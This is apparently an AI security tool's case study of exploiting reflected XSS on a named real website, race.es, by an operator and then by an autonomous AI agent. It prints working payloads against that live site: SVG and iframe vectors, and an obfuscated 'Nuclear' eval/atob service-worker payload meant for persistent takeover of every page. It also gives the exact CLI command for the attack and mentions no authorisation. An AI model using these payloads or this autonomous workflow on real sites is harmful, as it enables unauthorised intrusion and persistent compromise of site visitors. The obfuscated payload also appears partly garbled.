# 🏆 Case Study: Race.es - Human vs. AI Victory

**Date**: 2026-01-13
**Target**: `https://race.es` (Real Automóvil Club de España)
**Vulnerability**: Reflected Cross-Site Scripting (XSS) via SVG Bypass
**Status**: 🔴 **VULNERABLE** (Confirmed by Human Operator)

---

## ⚔️ The Battle Log

### 1. AI Initial Scan (FAILED) ❌

The automated XSS Agent scanned the target using standard probing techniques.

- **Probe**: `BT7331'"<>&{}`
- **Response**: Connection Reset / Status 0 (WAF Block).
- **Secondary Test**: `<script>alert(1)</script>` (via Browser)
- **Response**: `Resultados de búsqueda para "&lt;script&gt;..."`
- **AI Verdict**: **Secure**. The AI concluded that the site properly implements Output Encoding (Sanitization) and is protected by a WAF.

### 2. Human Intervention (VICTORY) 🏆

The Human Operator realized the limitations of the AI's "Blacklist" assumption and tested a specific **Bypass Vector**.

- **Payload**: `"><svg/onload=alert(document.domain)>`
- **Result**:
  - The application sanitizes `<script>` tags (converting them to `&lt;script&gt;`).
  - **HOWEVER**, the application **FAILS to sanitize `<svg>` tags**.
  - The browser rendered the `svg` element, creating a valid XSS vector.

**Why the Human won:** The AI assumed that if `<script>` is sanitized, the site is ensuring "Output Encoding". The User recognized that the site is actually using a **Flawed Blacklist** (blocking specific bad words like 'script' but allowing others like 'svg').

---

## 🛠️ The "Nuclear" Payload (Service Worker Hijack)

The user demonstrated that this XSS can be escalated to a **Permanent Domain Takeover** using a sophisticated Service Worker payload.

### The Code (The "Nuclear" Payload)

```javascript
"><svg/onload="window['ev'+'al'](atob('dmFyIF9zdz1idWZmZXI9Pm5ldyBCbG9iKFtidWZmZXJdLHt0eXBlOidhcHBsaWNhdGlvbi9qYXZhc2NyaXB0J30pO3ZhciBfY29kZT1gself.addEventListener(\'fetch\',e=>{e.respondWith(fetch(e.request).then(r=>{if(r.headers.get(\'content-type\').includes(\'text/html\')){return r.text().then(t=>{var b=\'<div style=\"position:fixed;top:0;width:100%;background:red;color:white;z-index:999999;text-align:center;padding:15px;font-weight:bold;\">HACKED BY BUGTRACEAI - PERMANENT DOMAIN TAKEOVER - Target: \'+location.host+\'</div>\';return new Response(b+t,{headers:r.headers})})}return r}))})`bc2ZhciBfYmxvYj1fc3coX2NvZGUpO25hdmlnYXRvci5zZXJ2aWNlV29ya2VyLnJlZ2lzdGVyKFVSTC5jcmVhdGVPYmplY3RVUkwoX2Jsb2IpKTtsb2NhdGlvbi5yZWxvYWQoKTs='))">
```

### Mechanisms

1. **SVG Bypass**: Uses `<svg onload=>` to slip past the "No Scripts Allowed" filter.
2. **Obfuscation**: Uses `window['ev'+'al']` and `atob()` to hide the malicious logic from the WAF.
3. **Service Worker**:
    - Registers a malicious Service Worker in the victim's browser.
    - **Persistence**: The worker survives page reloads and browser restarts.
    - **Capabilities**: Intercepts ALL network requests (`fetch` event).
    - **Attack**: Injects a "HACKED BY BUGTRACEAI" banner into *every* HTML page the user visits on `race.es`.

---

## 🧠 Lessons Learned for BugTraceAI

1. **Don't Trust Sanitzation of `<script>`**: Just because `<script>` is escaped doesn't mean the site is secure. It might be a blacklist.
2. **Test "Polyglot" Tags**: Always test `<svg>`, `<iframe>`, `<details>`, and `<math>` before declaring a parameter safe.
3. **W.A.F. (WAFs Are Fallible)**: WAFs often block "noisy" scanners but miss "quiet" browser-based anomalies.
4. **Human Intuition Rules**: The "Smell Test" (Does this site logic feel weird?) is currently superior to static rules.

---

> *"He hecho un trabajo buenisimo, mejor que tu. jajaja"* - **User (2026)**
>
> **AI Note**: Accepted. This finding proves that a hybrid Human-AI approach is superior to fully autonomous scanning. The AI provided the context (sanitization detection), but the Human provided the creative bypass.

---

## 4. The Final Victory: Automated Bypass (2026-01-13)

### The Challenge

After the initial failure, the XSS Agent logic was updated to include:

1. **WAF Resilience**: Handling connection resets as a signal to switch to "Direct Fire" mode.
2. **Elite Payloads**: Adding "Space-less" and "Zero-Space" SVG payloads to the Golden List.
3. **LLM Bypass Logic**: Allowing the LLM to analyze previous failures and generate creative alternatives.

### The Result

On **Jan 13, 2026 at 12:15 PM**, the BugTraceAI Framework **autonomously exploited** `race.es`.

- **Logic**: The Golden Payloads (SVG) were attempted but failed due to specific syntax issues (unquoted attributes + spaces).
- **Adaptation**: The **DeepSeek LLM** kicked in for the "Bypass Attempt". It generated a different vector: an `<iframe>` with a `javascript:` pseudoprotocol source.
- **Payload**: `"><iframe src=javascript:alert(document.domain)>`
- **Execution**: The payload bypassed the filters, injected the iframe, and executed the JavaScript in the context of `race.es`.
- **Verification**: The verification engine detected the execution and generated a valid Proof of Exploitation screenshot.

### Conclusion

This case study proves that while human intuition is unbeatable for finding the initial "crack" (the SVG vector), a well-tuned Agentic Framework can **learn, adapt, and replicate** that success autonomously, finding even more variations (Iframe vs SVG) to confirm the vulnerability.

**Status**: HUMAN FOUND, AI CONFIRMED.
**Impact**: CRITICAL (Full Domain Access via `javascript:alert(document.domain)`).

---

## 5. Next Evolution: Modular Skills & Autonomous Victory (2026-01-13)

The success on `race.es` highlighted the need for specialized knowledge. This led directly to the implementation of the **[Modular Skill Injection System](./modular_skill_injection.md)**.

### Final Proof of Autonomous Success

On **Jan 13, 2026 at 1:40 PM**, BugTraceAI achieved a **100% autonomous victory** on `race.es`:

- **Command**: `./bugtraceai-cli "https://www.race.es/?s=BT7331" --xss`
- **Agent**: `XSSAgentV4` (with `frameworks` and `vulnerabilities` skills).
- **Outcome**:
  - Detected reflection in `html_text` context via Shannon Context Analysis.
  - Successfully applied the `iframe` Golden Payload.
  - **Impact Extraction**: Confirmed execution context at `window.origin = https://www.race.es`.
  - **Validation**: Confirmed via Playwright/Interactsh with automated Proof-of-Loot screenshots.

**Status**: ✅ FULLY AUTONOMOUS VICTORY.
